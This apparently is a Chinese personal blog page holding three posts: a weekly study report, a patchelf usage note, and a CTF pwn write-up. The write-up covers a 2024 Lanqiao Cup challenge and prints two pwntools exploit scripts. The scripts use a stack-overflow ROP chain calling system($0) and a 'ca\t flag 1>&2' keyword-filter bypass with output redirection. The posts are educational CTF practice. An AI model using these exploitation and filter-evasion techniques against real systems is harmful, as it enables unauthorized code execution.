<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Wgiegie-纲的blog</title>

  <!-- keywords -->
  
    <meta name="keywords" content="Wgiegie">
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="纲的blog">
<meta property="og:url" content="https://2023478.github.io/index.html">
<meta property="og:site_name" content="纲的blog">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="wgiegie">
<meta property="article:tag" content="Wgiegie">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="纲的blog" type="application/atom+xml">
  
  
    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<meta name="generator" content="Hexo 7.1.1"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/"></a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>标签</li>
						
						<li>友情链接</li>
						
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 10px;">C语言</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/pwn/" style="font-size: 16.67px;">pwn</a> <a href="/tags/pwn%E5%A7%BF%E5%8A%BF/" style="font-size: 10px;">pwn姿势</a> <a href="/tags/pwn%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">pwn工具</a> <a href="/tags/pwn%E9%A2%98%E8%A7%A3/" style="font-size: 13.33px;">pwn题解</a> <a href="/tags/%E5%91%A8%E6%8A%A5/" style="font-size: 20px;">周报</a> <a href="/tags/%E5%A0%86/" style="font-size: 10px;">堆</a> <a href="/tags/%E6%90%AD%E5%8D%9A%E5%AE%A2/" style="font-size: 10px;">搭博客</a>
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
			        
			        </div>
				</section>
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-周报（2024-4-22-2024-4-28）" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/04/28/%E5%91%A8%E6%8A%A5%EF%BC%882024-4-22-2024-4-28%EF%BC%89/" class="article-date">
  	<time datetime="2024-04-28T14:06:45.000Z" itemprop="datePublished">2024-04-28</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/04/28/%E5%91%A8%E6%8A%A5%EF%BC%882024-4-22-2024-4-28%EF%BC%89/">
        周报（2024.4.15-2024.4.28）
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>好快，4月的最后一周都过去了，又到了写周报的时间，来吧来吧，把这个周做的事总结一下。</p>
<p>这个周还真是将上个周报里写的要多做题做到了，这周差不多做了一周的题，有关于堆的知识也是停滞不前，视频也没怎么看，还有最后两节那个视频就结束了，定个目标，下周正好在五一假期，那下周除了做题便是将那个视频看完，并做好笔记，截止时间便定为下次写周报的时候。</p>
<p>学到的东西：</p>
<p>不得不说做题的时候确实能学到一下好东西，这周主要做的两题，分别学到的</p>
<ul>
<li>patchelf这个工具的使用与不同版本的动态libc库与程序的链接</li>
<li>shell的全新获取方法（system($0)）</li>
<li>重定向输入&#x2F;输出</li>
</ul>
<p>好吧，说起来学到的也不是很多，这周被运动会耽误的时间还是太长了，这个周天终于开始了，快点整吧别耽误我时间。</p>
<p>行吧这周的总结到这里也结束了，下周五一假期就开始了，到时候多学一点东西吧。</p>
<p><img src="/2024/04/28/%E5%91%A8%E6%8A%A5%EF%BC%882024-4-22-2024-4-28%EF%BC%89/image-20240428223038045.png" alt="image-20240428223038045"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%A8%E6%8A%A5/" rel="tag">周报</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/%E5%91%A8%E6%8A%A5/">周报</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-shell的获取，输出重定向he例题" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/04/28/shell%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91he%E4%BE%8B%E9%A2%98/" class="article-date">
  	<time datetime="2024-04-28T12:11:01.000Z" itemprop="datePublished">2024-04-28</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/04/28/shell%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91he%E4%BE%8B%E9%A2%98/">
        shell的获取，输出重定向he例题
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>昨天学长在打完蓝桥杯后将其中的pwn题的一道给了我，让我整整，不算难，不过其中有的关于拿到shell的获取flag的姿势还是比较特殊的，属于不难但是比较偏的考点，确实我在做的时候并没有做出来，后来在学长的提醒与上网查资料下才知道的考点，故写一写这篇文章记录一下新学到的这个骚姿势。</p>
<p><strong>关于shell的获取</strong></p>
<p>在pwn题中出了那些上了沙箱的题目不能直接拿到shell外，其他的题主要目的便是拿到远程服务器的shell用以读取flag的值，因此shell的获取成为关键的一步，除去ret2dlresolve和SROP这种特殊方法拿到shell外，用system函数几乎是主要的方法</p>
<ol>
<li><code>system(/bin/sh)</code></li>
<li><code>system(sh)</code></li>
<li><code>system($0)</code></li>
</ol>
<p>以上这3种基本就是通过system函数执行参数拿到shell的方法。这里$0就这道要用到拿到shell的方法。</p>
<p>这3种方法主要以&#x2F;bin&#x2F;sh用的最多，这个参数在程序中可以通过libc的地址找到，sh则一般在程序中独立有的情况下才用。$0这更少只在特殊的题才会用到。</p>
<p><strong>输出重定向</strong></p>
<p>在shell命令中有一种叫Shell 输入&#x2F;输出重定向的规则，</p>
<p>我的理解便是在shell的交互过程中，通过一些命令的作用将其不再往常一样从屏幕上输入，并向屏幕上输出。</p>
<p>简单的就像将输入的过程重定向到某个文件中，那么shell便会将文件中的内容当命令一行一行的执行，而输出重定向则相反，通过将输出的过程重定向到某个文件，从而使shell将命令执行后的结果输出到该文件中，不再屏幕上输出。</p>
<p>看起来这个似乎与我们的拿取flag的内容关系不大，但在有的题目中出题人为了恶心人，会将有的字母标记为不可执行的字母，或者在命令中出现这些字母便不能执行，会报错不能达到命令的既定效果。就像蓝桥杯的这道题。在程序中便禁止<code>cat</code>的同时出现与<code>b，s，/，i，n</code>这几个字符的出现，同时还用close（1）函数将程序的输出关闭。</p>
<p>那我们输入的命令真的就不能执行吗，其实也一不一定，像将某些东西输出到屏幕上的命令如cat等其实程序是执行的不过在输出结果之前，因为程序中有close（1），程序便不会再将命令的执行效果输入到屏幕上，而是将报错的内容输出到屏幕上。既然如此，那我们有没有办法将程序执行结果的覆盖报错的结果并输出到屏幕上呢（前提这个命令在没有限制的前提下是能执行有结果的），这种办法便是输入重定向。</p>
<p>在了解这种方法之前我们还需要知道宁外一个知识点，<em>文件描述符</em>（fd）</p>
<p>这个文件描述符通常有数字表示</p>
<ul>
<li><code>0</code> 代表标准输入（stdin）。</li>
<li><code>1</code> 代表标准输出（stdout）。</li>
<li><code>2</code> 代表标准错误输出（stderr）。</li>
</ul>
<p>0代表输入，1代表输入（正确的结果），2代表报错的内容输出</p>
<p>既然知道这个了便可以想想在之前的重定向中输入的过程便是文件描述符中的0，正确执行结果的输出便是1，报错内容的输出便是2，那在重定向的过程中如果我们能将1的输出重定向成2，那便是将正确的结果替换成报错的结果被程序当做应该输入到屏幕上的内容输入到屏幕上。（好像有点绕，不够多看几遍应该能理解吧）</p>
<p>在这里用这个方法的主要原因在于之前的程序中有一个close（1）这个命令，将程序的标准输出关闭了，使得程序中的执行结果的输入通道被关闭，于是程序中的命令在执行后的结果不能正确输出，于是便用重定向将标准输出替换为错误输出，将我们想要的结果输出出来。</p>
<p>这个命令是什么呢，就是<strong>2&gt;&amp;1</strong>这个</p>
<p>在命令中，<code>2&gt;&amp;1</code> 是用来重定向标准错误（stderr）到标准输出（stdout）的。</p>
<ul>
<li><code>2</code> 代表标准错误（stderr）。</li>
<li><code>1</code> 代表标准输出（stdout）。</li>
<li><code>&gt;</code> 是重定向操作符。</li>
<li><code>&amp;</code> 表示我们是在重定向一个文件描述符（在这种情况下是标准错误），而不是创建一个名为<code>&amp;1</code>的文件。</li>
</ul>
<p>因此，<code>2&gt;&amp;1</code> 说的是：“将标准错误（文件描述符2）重定向到与标准输出（文件描述符1）相同的地方。”</p>
<p><code>1&gt;&amp;2</code> 说的是：“将标准输出（文件描述符1）重定向到与标准错误（文件描述符2）相同的地方</p>
<p>就这样便可以完美避过在程序中对我们命令的检查，从而执行我们想要的命令并获得想要的结果。</p>
<p>关于这个命令的使用，很简单，就加再正常命令的后面，如</p>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag <span class="number">1</span>&gt;&amp;<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>直接这样用便是可以的了。具体的我们以下面这道例题分析。</p>
<p>2024蓝桥杯的pwn题，先checksec一下</p>
<p><img src="/2024/04/28/shell%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91he%E4%BE%8B%E9%A2%98/image-20240428212948696.png" alt="image-20240428212948696"></p>
<p>没什么保护，并且这道题没有给libc版本说明这道题不用去泄露libc的地址也是能做的，不考虑环境问题。</p>
<p>来看主函数</p>
<p><img src="/2024/04/28/shell%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91he%E4%BE%8B%E9%A2%98/image-20240428213213551.png" alt="image-20240428213213551"></p>
<p>init函数只是在释放缓冲区并没有什么用，不用管，可以看到程序先是向info中读入0xe长度的数据，并且这个info不是栈的变量而是一个bss段的空间，故我们想info中读取的数据存放在哪我们是知道并且可以利用的，后面便是一个栈溢出的漏洞，虽然能溢出的大小不算太大但也不小，足够执行一些命令了，然后便是来到check函数这</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl check()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned <span class="built_in">int</span> i; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0xD</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( info[i] == <span class="string">&#x27;c&#x27;</span> &amp;&amp; info[i + <span class="number">1</span>] == <span class="string">&#x27;a&#x27;</span> &amp;&amp; info[i + <span class="number">2</span>] == <span class="string">&#x27;t&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">&quot;Do not use `cat` command.&quot;</span>);</span><br><span class="line">      exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( info[i] == <span class="string">&#x27;b&#x27;</span> || info[i] == <span class="string">&#x27;s&#x27;</span> || info[i] == <span class="string">&#x27;/&#x27;</span> || info[i] == <span class="string">&#x27;i&#x27;</span> || info[i] == <span class="string">&#x27;n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">&quot;Do not use some other characters.&quot;</span>);</span><br><span class="line">      exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> close(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里便是其内容，简单来说便是对输入到info中的数据进行检测，使其中不能有连续的<code>cat</code>出现和<code>b，s，/，i，n</code>这几个字符的单独出现。这里看似只是检测info中的数据但是在拿到shell后会发现这个检测对向shell中输入的命令也是存在的（这已经是后话了目前主要先拿到shell）</p>
<p>并且之这个函数的最后一行命令是<code>return close(1);</code></p>
<p>close函数是与open函数相对的函数，open的意思在于打开某个东西的意思，而close的意思在于关闭某个东西的意思，在这里由于使用close关闭1，这里1作为单独的参数出现便表明这里的意思为前文标准输出（stdout），然后再结合关闭这个函数，在这里便是使用程序将标准输出这个通道关闭，使得在后面的程序对于执行的命令不在将执行的结果输出，看到这里其实便可以想到使用要使用重定向这个过程，将输出的过程覆盖错误输出的过程，讲我们需要的结果打印出来。</p>
<p>在回到main函数中，仔细看这个程序会发现在程序中其实是有后门函数的</p>
<p><img src="/2024/04/28/shell%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91he%E4%BE%8B%E9%A2%98/image-20240428214648408.png" alt="image-20240428214648408"></p>
<p>有system函数，不过其中的参数没什么有，不过既然有这个函数那便可以调用这个函数，那现在我们便只用解决参数的问题然后便可以调用system函数从而获得shell，</p>
<p>在一开始时程序可想info的地方输入数据，并且这个info的地址还是已知的存在，不过在后面的检查中不能有连续的<code>cat</code>出现和<code>b，s，/，i，n</code>这几个字符的单独出现，那拿到shell的前两种方法便已经没用了，还有一种$0似乎可以，先向info中输入$0，然后在栈溢出中将info的地址赋值给rdi寄存器，然后调用system函数从而执行<code>system（$0）</code>命令获得shell。<br>exp如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *0x4008a1&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#io.sendafter(&#x27;stack.\n&#x27;,b&#x27;ca\\t flag 1&gt;&amp;2&#x27;)</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;stack.\n&#x27;</span>,<span class="string">b&#x27;$0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">info=<span class="number">0x601090</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x400933</span></span><br><span class="line">system=<span class="number">0x4005D0</span></span><br><span class="line">ret=<span class="number">0x00000000004005ae</span></span><br><span class="line"></span><br><span class="line">printf=<span class="number">0x4008A1</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi_ret)+p64(info)+p64(ret)+p64(system)</span><br><span class="line">payload = payload.ljust(<span class="number">0x48</span>,<span class="string">b&quot;A&quot;</span>)</span><br><span class="line">io.sendafter(<span class="string">&#x27;...\n&#x27;</span>,payload)</span><br><span class="line"><span class="comment">#static-sh ./flag</span></span><br><span class="line"><span class="comment">#exec 1&gt;&amp;2   cat flag</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>好像这样执行拿到shell就大工告急了，but，</p>
<p><img src="/2024/04/28/shell%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91he%E4%BE%8B%E9%A2%98/image-20240428220239242.png" alt="image-20240428220239242"></p>
<p>在shell执行命令后会发现之前check函数的检测还在，同时由于之前在check函数中有<code>close（1）</code>这个命令使得程序的标准输出被关闭，不能在将我们需要的结果输出只输出错误结果，那现在的问题就在与如何将这个检测绕过了。</p>
<p>其实答案就在上面知识点的那个输出重定向，便可以完美解决这里的问题，既然程序只能输出错误结果那我就将标准输出重定向到错误结果输出这里，是程序认为，标准输出的结果是错误输出的结果将其输出。</p>
<p>这个重定向的启动该怎么启动，在这道题中有两种方法，一种是直接打印不拿shell，宁一种是在拿到shell后使用命令重定向。</p>
<p><em>1.拿到shell后使用命令重定向</em></p>
<p>在拿到程序的shell后执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec <span class="number">1</span>&gt;$<span class="number">2</span></span><br><span class="line">cat flag</span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="/2024/04/28/shell%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91he%E4%BE%8B%E9%A2%98/image-20240429111056137.png" alt="image-20240429111056137"></p>
<p>解释一下第一行命令，exec这个命令的意思在于，在当前shell的前提下重新再打开一个shell，并且结合后面的命令对这个新的shell进行改变。后面这个1&gt;$2,便是输出重定向的内容，</p>
<p>全意便是，在当前这个shell的前提下重新打开一个shell，并且在这个shell中程序的标准输出将覆盖错误输出，由于在之前的shell中，标准输出已知被关闭了，如果我们输入cat等命令只会输出错误结果。而在新的shell中程序会把cat等命令的标准输出当做错误结果输出。这样我们便可以在新的shell中拿到flag的值。</p>
<p><em>2.直接打印不拿shell</em></p>
<p>输出重定向的过程除了重新启动一个新的shell完，还可以在单独的命令中使用如</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag <span class="number">1</span>&gt;$<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>在这里程序便会将这一行命令的标准输出覆盖错误输出，将执行结果输出，不过在拿到shell后想执行这个命令并不能成功，</p>
<p><img src="/2024/04/28/shell%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91he%E4%BE%8B%E9%A2%98/image-20240429112924204.png" alt="image-20240429112924204"></p>
<p>其主要原因我估计还是在对cat的检查上便已经停止执行了。</p>
<p>既然在shell中执行不成功，那我们便要想其他办法，来将flag打印出来。</p>
<p>其实在之前的system函数的执行中就有一种办法，在system函数的执行除了执行<code>/bin/sh</code>拿到shell外，其实还可以直接执行<code>cat flag</code>这个参数将flag的内容打印出来，不过由于这个参数一般不好找故不常用，不过在这里由于一开始可以向一个地址输入数据，所以这里是可以用的，在加上之前的重定位，关于close（1）的这里便可以绕过，</p>
<p>但是这里还有一个关于cat的检查，这个其实也有办法绕过，可以再命令中使用<strong>‘\’</strong>这个加载cat的中间，使其成为<code>c\at或c\at</code>,在shall命令中**’\‘**这个并不代表任何意思，无论你加在哪里都没有问题，程序都会默认执行，不去管这个符号的存在，那这样我们便可以利用这个符号绕过cat的检测。</p>
<p>但这个符号的使用会出现很多问题，</p>
<ol>
<li>不能再shell中使用，因为我们的shell是通过python链接的故单独的\会被程序认为是\\从而出现错误（在py语法中\\才能在打印过程中表示\）</li>
<li>在输入程序中也不许用\\才能输入\</li>
</ol>
<p>因此在程序的第一次输入中，要输入</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca\\t flag <span class="number">1</span>&gt;&amp;<span class="number">2</span>或c\\at flag <span class="number">1</span>&gt;&amp;<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>然后在调用这个参数通过system函数执行这样程序便会直接将flag的内容打印在屏幕上了，</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *0x4008a1&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&#x27;stack.\n&#x27;</span>,<span class="string">b&#x27;ca\\t flag 1&gt;&amp;2&#x27;</span>)</span><br><span class="line"><span class="comment">#io.sendafter(&#x27;stack.\n&#x27;,b&#x27;$0&#x27;)</span></span><br><span class="line"></span><br><span class="line">info=<span class="number">0x601090</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x400933</span></span><br><span class="line">system=<span class="number">0x4005D0</span></span><br><span class="line">ret=<span class="number">0x00000000004005ae</span></span><br><span class="line"></span><br><span class="line">printf=<span class="number">0x4008A1</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi_ret)+p64(info)+p64(ret)+p64(system)</span><br><span class="line">payload = payload.ljust(<span class="number">0x48</span>,<span class="string">b&quot;A&quot;</span>)</span><br><span class="line">io.sendafter(<span class="string">&#x27;...\n&#x27;</span>,payload)</span><br><span class="line"><span class="comment">#static-sh ./flag</span></span><br><span class="line"><span class="comment">#exec 1&gt;&amp;2   cat flag</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/2024/04/28/shell%E7%9A%84%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91he%E4%BE%8B%E9%A2%98/image-20240429115911123.png" alt="image-20240429115911123"></p>
<p>好了，那这道题就到此为止吧。run</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn%E5%A7%BF%E5%8A%BF/" rel="tag">pwn姿势</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/pwn/">pwn</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-patchelf使用和例题" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/04/26/patchelf%E4%BD%BF%E7%94%A8%E5%92%8C%E4%BE%8B%E9%A2%98/" class="article-date">
  	<time datetime="2024-04-26T13:47:24.000Z" itemprop="datePublished">2024-04-26</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/04/26/patchelf%E4%BD%BF%E7%94%A8%E5%92%8C%E4%BE%8B%E9%A2%98/">
        patchelf使用和例题
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>之前打了一下他们中国海洋大学的比赛，ε&#x3D;(´ο｀*)))唉太痛了，好几题都已将被打烂了，都没整出来，花了好几天才整出来一天，这一题还有的关键的地方是学长交的，太菜了，写这篇文件记录一下吧</p>
<p>写这篇文章的时候比赛还没有结束，那关于题目的wp等比赛结束了在发出来</p>
<img src="/2024/04/26/patchelf%E4%BD%BF%E7%94%A8%E5%92%8C%E4%BE%8B%E9%A2%98/image-20240427093653994.png" alt="image-20240427093653994" style="zoom:25%;">

<p><img src="/2024/04/26/patchelf%E4%BD%BF%E7%94%A8%E5%92%8C%E4%BE%8B%E9%A2%98/image-20240427093659333.png" alt="image-20240427093659333"></p>
<p><strong>有关于patchelf这个工具的使用</strong></p>
<p>在pwn题中，很多题目在远程的环境有很多种而这些不同的环境对pwn题的影响有很大，有的题目的编译环境与能不能打通有直接的关联，在本地的程序一般会直接使用本地的libc这会使我们在攻击本地与攻击远程有很大的出入，而patchelf这个工具的最大用处便是将远程的环境与本地环境不同的这个问题解决的很好用的工具。</p>
<p>一般远程的libc版本在题目中是会随可执行文件一起能被下载的，而这个工具的作用便是在于将本地的可执行文件（elf文件）的调用libc库从本地的固定的库转换为题目中提供的那个，是我们在攻击时，能保持本地与远程环境的一致，方便本地的攻击与调式。在本地打通后只要将链接的方式改为远程便可以</p>
<p>现在先介绍关于这个工具的使用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">patchelf --<span class="built_in">set</span>-interpreter /home/giantbranch/Desktop/glibc-all-in-one/libs/<span class="number">2.31</span><span class="number">-0b</span>untu9<span class="number">.9</span>_amd64/ld<span class="number">-2.31</span>.so --<span class="built_in">set</span>-rpath /home/giantbranch/Desktop/glibc-all-in-one/libs/<span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.9</span>_amd64 <span class="title function_">login</span><span class="params">(文件名)</span></span><br><span class="line">    </span><br><span class="line">    patchelf --<span class="built_in">set</span>-interpreter libc文件名（包括路径） --<span class="built_in">set</span>-rpath libc文件所在的文件夹全名（包括路径） pwn（文件名） </span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --<span class="built_in">set</span>-interpreter  /home/wzg/tools/glibc_all_in_one/glibc-<span class="built_in">all</span>-<span class="keyword">in</span>-one/libs/<span class="number">2.23</span>-0ubuntu11<span class="number">.3</span>_amd64/libc-<span class="number">2.23</span>.so（根据题目要求的libc版本来） --<span class="built_in">set</span>-rpath /home/wzg/tools/glibc_all_in_one/glibc-<span class="built_in">all</span>-<span class="keyword">in</span>-one/libs/<span class="number">2.23</span>-0ubuntu11<span class="number">.3</span>_amd64（文件夹名固定） pwn</span><br></pre></td></tr></table></figure>



<p>如果在远程的libc版本在本地的libc库中没有，将其拖入那个文件夹中便可以。</p>
<p>关于这个工具的下载一下是其在github上的位置，可以按文档上的介绍来做（中间可能会遇到一些问题，可以上网查一下，我是学长直接帮我下好的，我是菜狗）</p>
